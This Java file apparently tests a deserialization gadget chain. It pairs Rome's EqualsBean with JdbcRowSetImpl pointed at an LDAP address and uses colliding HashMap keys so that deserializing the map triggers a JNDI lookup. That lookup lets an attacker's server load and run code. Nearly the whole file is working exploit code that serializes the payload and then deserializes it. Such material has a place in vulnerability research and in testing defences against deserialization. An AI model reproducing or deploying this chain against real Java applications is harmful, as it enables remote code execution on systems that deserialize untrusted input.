package com.test.gadget;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import tools.ReflectTools;

import java.util.HashMap;

public class tmp1 {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/2d4ade");
        EqualsBean equalsBean = new EqualsBean(JdbcRowSetImpl.class, jdbcRowSet);

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap1.put("zZ", equalsBean);
        hashMap1.put("yy", jdbcRowSet);
        hashMap2.put("zZ", jdbcRowSet);
        hashMap2.put("yy", equalsBean);

        HashMap<Object, Object> finalMap = ReflectTools.makeMap(hashMap2, hashMap1);

        byte[] bytes = ReflectTools.ser2bytes(finalMap);
        ReflectTools.deser(bytes, null);
    }
}
